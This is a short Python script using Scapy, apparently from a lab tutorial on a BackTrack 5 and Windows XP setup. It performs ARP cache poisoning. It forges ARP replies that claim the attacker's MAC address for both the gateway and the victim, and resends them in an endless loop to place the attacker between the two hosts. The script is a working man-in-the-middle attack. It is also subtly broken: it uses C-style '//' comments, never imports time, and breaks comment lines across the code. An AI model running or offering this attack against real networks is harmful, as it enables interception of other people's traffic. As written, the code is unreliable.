#!/bin/python
import sys
from scapy.all import*

attacker_mac="02:00:3B:41:09:01"             // The attacker's MAC Address
victim_ip="10.10.111.110"                    // Target’s IP address
router_ip="10.10.111.1"                      // Router’s(Gateway’s) IP address
victim_mac="02:00:1B:77:0D:01"               //Target’s MAC Address
router_mac="02:00:1B:5B:0B:02"               // Router’s(Gateway’s) MAC Address

arp_victim=ARP(op=2,psrc= router_ip,pdst= victim_ip, hwsrc= attacker_mac, hwdst=
victim_mac)

// Sending the ARP reply to the target machine that it I am the Gateway with IP address
10.10.111.1 and MAC address of BT5 (attacker’s machine) which makes XP machine to believe
that BT5 is its Gateway as shown below in the screenshot.

arp_gw=ARP(op=2,psrc=victim_ip,pdst= router_ip,hwsrc= attacker_mac,hwdst= router_mac)

// Sending the ARP reply to the gateway that it I am the XP machine with IP address
10.10.111.110 and MAC address of BT5 (attacker’s machine) which makes Gateway to believe
that BT5 is XP machine as shown below in the screenshot.

while 1:
send(arp_victim)
send(arp_gw)
time.sleep(2)

//sending multiple gratitious ARP packets to gateway and the target machine using
send(arp_victim) ans send(arp_gw) changes the IP-MAC tables which is as shown below in the
screenshots
